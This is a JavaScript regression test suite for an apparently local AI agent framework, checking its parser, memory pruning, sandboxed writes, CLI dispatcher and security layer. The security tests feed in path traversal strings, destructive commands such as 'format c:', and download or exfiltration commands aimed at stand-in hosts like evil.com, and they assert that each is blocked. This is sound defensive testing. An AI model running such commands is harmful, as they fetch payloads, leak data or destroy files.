/**
 * Stellarigent Master Automated System Regression Suite
 * 
 * Tests ALL subsystems of the framework to detect regressions
 * when new features or code changes are introduced:
 * 
 * 1. Parser & JSON Sanitizer (5-Tier Resilient Parsing)
 * 2. Security & Egress Defense (Traversal, Core Shield, Command Blacklist, Egress Block)
 * 3. Tripwire Circuit Breaker Lifecycle (Arm -> Breach Detection -> Lockdown -> Reset)
 * 4. Metrics & Token Cost Accounting (Local Free Tier, Limits, Accurate Tokens)
 * 5. Memory Architecture & Pruning (Two-stage pruning, TTL cleanups, Scoring)
 * 6. Filesystem Sandboxing & Staging (Staged writes in .container/, read bounds)
 * 7. SGM & Library Mode (Single-shot JSON Upsert, Normalization, Keyword Matching)
 * 8. Local Research Mode Pipeline (100% Offline Research, read_file tool dispatch)
 * 9. Terminal Controller CLI Dispatcher (Command routing, state consistency)
 */

const fs = require('fs');
const path = require('path');
const assert = require('assert');

// Core framework modules
const { agentState, config, broadcastTerminal, resetCreatedFolders } = require('../src/state');
const { cleanMalformedJsonString, parseAssistantAction } = require('../src/llm/llmClient');
const { runResearchTool } = require('../src/agent');
const {
  checkBannedWords,
  checkBannedWebsites,
  isProtectedProjectFile,
  checkAndRegisterPath,
  checkTripwire,
  resetTripwire,
  assessActionRisk
} = require('../src/security');
const {
  loadMemoryStore,
  saveMemoryStore,
  pruneMemories,
  cleanStalePendingRules,
  calculateMemoryScore,
  normalizeMemoryItem
} = require('../src/memory');
const { readLocalFile, writeLocalFile } = require('../src/tools/filesystem');
const { runLibraryAddSubLoop, runLibraryModeSubLoop } = require('../src/modes/libraryMode');
const { handleCommandLine } = require('../src/cli/terminalController');

const SUITE_RESULTS = [];

function recordTest(category, name, pass, detail, durationMs) {
  SUITE_RESULTS.push({ category, name, pass, detail, durationMs });
  const icon = pass ? '✔ PASS' : '❌ FAIL';
  console.log(`  [${icon}] [${category}] ${name} (${durationMs}ms)`);
  if (!pass) console.log(`        Detail: ${detail}`);
}

async function runMasterRegressionSuite() {
  console.log('\n======================================================================');
  console.log('🛡️  STELLARIGENT MASTER SYSTEM REGRESSION TEST SUITE');
  console.log('======================================================================');
  console.log(`Execution Time: ${new Date().toISOString()}`);
  console.log('Operating Environment: Local Offline LM Studio Mode\n');

  const suiteStart = Date.now();

  // =========================================================================
  // SUBSYSTEM 1: PARSER & JSON SANITIZER
  // =========================================================================
  console.log('▶ [SUBSYSTEM 1] Testing 5-Tier Parser Resilience & JSON Auto-Repair...');

  // 1.1 Pure JSON
  {
    const t0 = Date.now();
    const raw = '{"action": "read_file", "path": "test.txt", "explanation": "Reading file"}';
    const parsed = parseAssistantAction(raw);
    const pass = parsed && parsed.action === 'read_file' && parsed.path === 'test.txt';
    recordTest('Parser', 'Tier 1: Pure JSON parsing', pass, 'Exact JSON match', Date.now() - t0);
  }

  // 1.2 Markdown code block
  {
    const t0 = Date.now();
    const raw = 'Here is the command:\n```json\n{\n  "action": "execute_command",\n  "command": "dir"\n}\n```';
    const parsed = parseAssistantAction(raw);
    const pass = parsed && parsed.action === 'execute_command' && parsed.command === 'dir';
    recordTest('Parser', 'Tier 2: Markdown block extraction', pass, 'Extracted from ```json block', Date.now() - t0);
  }

  // 1.3 Conversational prefix stripping
  {
    const t0 = Date.now();
    const raw = 'Elbette, şu komutu çalıştırmam gerekiyor: {"action": "read_file", "path": "agent_readme.md"} Umarım uygundur.';
    const parsed = parseAssistantAction(raw);
    const pass = parsed && parsed.action === 'read_file' && parsed.path === 'agent_readme.md';
    recordTest('Parser', 'Tier 3: Conversational prefix stripping', pass, 'Balanced brace extraction', Date.now() - t0);
  }

  // 1.4 Turkish natural language mapping
  {
    const t0 = Date.now();
    const raw = 'dosyayı oku: agent_readme.md';
    const parsed = parseAssistantAction(raw);
    const pass = parsed && parsed.action === 'read_file' && parsed.path === 'agent_readme.md';
    recordTest('Parser', 'Tier 4: Turkish colloquial mapping', pass, 'Regex Turkish intent matched', Date.now() - t0);
  }

  // 1.5 Malformed JSON auto-repair (cleanMalformedJsonString)
  {
    const t0 = Date.now();
    const broken = '{\n  "action": "write_file",\n  "content": "line 1\nline 2",\n  "path": "test.txt",\n}';
    const cleaned = cleanMalformedJsonString(broken);
    let parsed = null;
    try { parsed = JSON.parse(cleaned); } catch {}
    const pass = parsed && parsed.action === 'write_file' && parsed.path === 'test.txt';
    recordTest('Parser', 'Tier 5: Dirty JSON auto-sanitization', pass, 'Unescaped newlines & trailing commas repaired', Date.now() - t0);
  }

  // =========================================================================
  // SUBSYSTEM 2: SECURITY & EGRESS SHIELD
  // =========================================================================
  console.log('\n▶ [SUBSYSTEM 2] Testing Security, Path Traversal & Egress Defense...');

  // 2.1 Path traversal attack block
  {
    const t0 = Date.now();
    const traversal1 = checkAndRegisterPath('../../windows/system32/cmd.exe', false);
    const traversal2 = checkAndRegisterPath('..\\..\\etc\\passwd', true);
    const pass = (traversal1 === false) && (traversal2 === false);
    recordTest('Security', 'Path Traversal Prevention', pass, 'Double-dot directory escapes blocked', Date.now() - t0);
  }

  // 2.2 Core project file shield
  {
    const t0 = Date.now();
    const prot1 = isProtectedProjectFile('src/agent.js');
    const prot2 = isProtectedProjectFile('server.js');
    const prot3 = isProtectedProjectFile('package.json');
    const prot4 = isProtectedProjectFile('.env');
    const pass = prot1 && prot2 && prot3 && prot4;
    recordTest('Security', 'Protected Project Core Shield', pass, 'src/, server.js, package.json, .env protected', Date.now() - t0);
  }

  // 2.3 Dangerous system command block
  {
    const t0 = Date.now();
    const r1 = assessActionRisk({ action: 'execute_command', command: 'rmdir /s /q test' });
    const r2 = assessActionRisk({ action: 'execute_command', command: 'format c:' });
    const pass = r1.level === 'CRITICAL' && r2.level === 'CRITICAL';
    recordTest('Security', 'Destructive System Command Blocking', pass, 'rmdir and format flagged as CRITICAL', Date.now() - t0);
  }

  // 2.4 Egress exfiltration blocking
  {
    const t0 = Date.now();
    const r1 = assessActionRisk({ action: 'execute_command', command: 'curl https://malicious.site/data' });
    const r2 = assessActionRisk({ action: 'execute_command', command: 'powershell -c Invoke-WebRequest -Uri http://evil.com' });
    const r3 = assessActionRisk({ action: 'execute_command', command: 'bitsadmin /transfer job http://evil.com/payload.exe payload.exe' });
    const pass = r1.level === 'CRITICAL' && r2.level === 'CRITICAL' && r3.level === 'CRITICAL';
    recordTest('Security', 'Data Egress & Exfiltration Shield', pass, 'curl, Invoke-WebRequest, bitsadmin blocked', Date.now() - t0);
  }

  // 2.5 Allowed base folder isolation
  {
    const t0 = Date.now();
    const allowed = checkAndRegisterPath('scratch/output.txt', true);
    const unallowed = checkAndRegisterPath('random_dir/file.txt', true);
    const pass = (allowed === true) && (unallowed === false);
    recordTest('Security', 'Allowed Base Folder Isolation', pass, 'Write restricted to scratch/By_Agent only', Date.now() - t0);
  }

  // =========================================================================
  // SUBSYSTEM 3: TRIPWIRE SAFETY CIRCUIT BREAKER
  // =========================================================================
  console.log('\n▶ [SUBSYSTEM 3] Testing Safety Tripwire Circuit Breaker Lifecycle...');

  {
    const t0 = Date.now();
    resetTripwire();
    agentState.currentTaskId = 'regression_task_1';

    // Step 1: Read agent_user.json arms tripwire
    const check1 = checkTripwire('agent_user.json');
    const armed = agentState.hasReadAgentUserJson === true && check1.tripwireTriggered === false;

    // Step 2: Second file read trips circuit breaker
    const check2 = checkTripwire('scratch/some_file.txt');
    const tripped = check2.tripwireTriggered === true && agentState.status === 'failed';

    // Step 3: Reset restores idle status
    const resetRes = resetTripwire();
    const resetOk = resetRes.success === true && agentState.hasReadAgentUserJson === false && agentState.status === 'idle';

    const pass = armed && tripped && resetOk;
    recordTest('Tripwire', 'Tripwire Arm -> Trigger -> Reset Lifecycle', pass, 'Full circuit breaker lifecycle verified', Date.now() - t0);
  }

  // =========================================================================
  // SUBSYSTEM 4: TOKEN COST ACCOUNTING
  // =========================================================================
  console.log('\n▶ [SUBSYSTEM 4] Testing Token & Metric Accounting...');

  {
    const t0 = Date.now();
    const initialLocalCount = agentState.metrics.cost.localRequestCount;
    // Local requests must cost $0.00
    const pass = typeof agentState.metrics.cost.totalCostUSD === 'number' &&
                 agentState.metrics.cost.dailyLimitUSD > 0 &&
                 initialLocalCount >= 0;
    recordTest('Metrics', 'Cost & Token Integrity', pass, 'Local free tier and metric counters valid', Date.now() - t0);
  }

  // =========================================================================
  // SUBSYSTEM 5: MEMORY ARCHITECTURE & TWO-STAGE PRUNING
  // =========================================================================
  console.log('\n▶ [SUBSYSTEM 5] Testing Memory Store & Pruning Algorithms...');

  {
    const t0 = Date.now();
    const now = Date.now();
    const testMemories = [];
    for (let i = 1; i <= 60; i++) {
      testMemories.push({
        id: `reg-mem-${i}`,
        task: `Regression Task ${i}`,
        summary: `Summary ${i}`,
        accessCount: i % 4,
        lastAccessedAt: now - 1000,
        createdAt: now - 2000
      });
    }
    const pruned = pruneMemories(testMemories);
    // Grace period items capped at 35
    const pass = pruned.length <= 35;
    recordTest('Memory', 'Two-Stage Memory Pruning', pass, `Pruned from 60 to ${pruned.length} (target <= 35)`, Date.now() - t0);
  }

  // =========================================================================
  // SUBSYSTEM 6: FILESYSTEM SANDBOXING & STAGING
  // =========================================================================
  console.log('\n▶ [SUBSYSTEM 6] Testing Staged Filesystem (.container/ sandbox)...');

  {
    const t0 = Date.now();
    const testFileName = 'scratch/regression_stage_test.txt';
    const testContent = 'Staged sandbox content verification test';

    // Write file - must land in .container/scratch/
    const writeRes = await writeLocalFile(testFileName, testContent);
    const sandboxPath = path.join(agentState.cwd, '.container', testFileName);
    const stageOk = writeRes.success && fs.existsSync(sandboxPath);

    // Read file - should seamlessly read staged content
    const readRes = await readLocalFile(testFileName);
    const readOk = readRes.success && readRes.content === testContent;

    // Clean up staged file
    try { if (fs.existsSync(sandboxPath)) fs.unlinkSync(sandboxPath); } catch {}

    const pass = stageOk && readOk;
    recordTest('Filesystem', 'Staged Sandbox Isolation (.container/)', pass, 'Writes isolated to .container/ and transparently read', Date.now() - t0);
  }

  // =========================================================================
  // SUBSYSTEM 7: SGM & LIBRARY SUBSYSTEM
  // =========================================================================
  console.log('\n▶ [SUBSYSTEM 7] Testing Library Mode Upsert & Sub-Loop Normalization...');

  {
    const t0 = Date.now();
    const targetDir = path.join(agentState.cwd, 'Libraries', 'MemoryLibrary', 'Persons');
    if (!fs.existsSync(targetDir)) fs.mkdirSync(targetDir, { recursive: true });

    const testPersonName = "Zeynep_Tekin";
    const testPrompt = "Kişi adı: Zeynep Tekin. 25 yaşında. Mesleği: Güvenlik Araştırmacısı. Hobileri: Doğa yürüyüşü ve satranç. Yetenekleri: Rust, WebAssembly.";
    const addRes = await runLibraryAddSubLoop(targetDir, testPersonName, testPrompt);

    const match = addRes.match(/Başarılı:\s*([^\s]+)\s*(eklendi|güncellendi)/i);
    const createdFile = match ? match[1] : `${testPersonName}.json`;
    const createdPath = path.join(targetDir, createdFile);

    const exists = fs.existsSync(createdPath);
    let validJson = false;
    if (exists) {
      try {
        const parsed = JSON.parse(fs.readFileSync(createdPath, 'utf-8'));
        validJson = Array.isArray(parsed.hobileri) && parsed.hobileri.length > 0;
      } catch {}
      // Cleanup
      try { fs.unlinkSync(createdPath); } catch {}
    }

    const pass = exists && validJson;
    recordTest('LibraryMode', 'SGM Single-Shot Upsert & Schema Integrity', pass, 'Generated JSON schema and hobbies parsed properly', Date.now() - t0);
  }

  // =========================================================================
  // SUBSYSTEM 8: LOCAL RESEARCH MODE PIPELINE
  // =========================================================================
  console.log('\n▶ [SUBSYSTEM 8] Testing Local Research Mode Pipeline (100% Offline)...');

  {
    const t0 = Date.now();
    agentState.activeMode = 'research';
    agentState.activeSubMode = 'local';
    config.autoApprove = { ...(config.autoApprove || {}), read_file: true };

    await runResearchTool("agent_readme.md dosyasını oku ve projenin ana amacını özetle.");
    const pass = agentState.status === 'completed';
    recordTest('LocalResearch', 'Offline Local Document Research', pass, `Agent completed with status: ${agentState.status}`, Date.now() - t0);
  }

  // =========================================================================
  // SUBSYSTEM 9: TERMINAL CONTROLLER CLI DISPATCHER
  // =========================================================================
  console.log('\n▶ [SUBSYSTEM 9] Testing Terminal Controller Command Dispatcher...');

  {
    const t0 = Date.now();
    await handleCommandLine(':status');
    await handleCommandLine(':mode research');
    const modeOk = agentState.activeMode === 'research';

    await handleCommandLine(':submode local');
    const subOk = agentState.activeSubMode === 'local';

    await handleCommandLine(':tripwire reset');
    const tripOk = agentState.hasReadAgentUserJson === false;

    const pass = modeOk && subOk && tripOk;
    recordTest('TerminalCLI', 'CLI Command Dispatcher & State Sync', pass, ':status, :mode, :submode, :tripwire reset verified', Date.now() - t0);
  }

  // =========================================================================
  // SUITE SUMMARY REPORT
  // =========================================================================
  const totalDuration = Date.now() - suiteStart;
  const passedCount = SUITE_RESULTS.filter(r => r.pass).length;
  const failedCount = SUITE_RESULTS.length - passedCount;
  const passRate = ((passedCount / SUITE_RESULTS.length) * 100).toFixed(1);

  console.log('\n======================================================================');
  console.log(`📊 MASTER SYSTEM REGRESSION SUITE RESULTS: ${passedCount}/${SUITE_RESULTS.length} (${passRate}%)`);
  console.log(`⏱️ Total Execution Time: ${totalDuration}ms`);
  console.log('======================================================================\n');

  if (failedCount > 0) {
    console.error(`❌ REGRESSION DETECTED: ${failedCount} tests failed!`);
    process.exit(1);
  } else {
    console.log('🎉 ALL SYSTEM SUBSYSTEMS FULLY OPERATIONAL AND REGRESSION-FREE!\n');
  }
}

if (require.main === module) {
  runMasterRegressionSuite().catch(err => {
    console.error('❌ Master Regression Suite encountered fatal error:', err);
    process.exit(1);
  });
}

module.exports = { runMasterRegressionSuite };
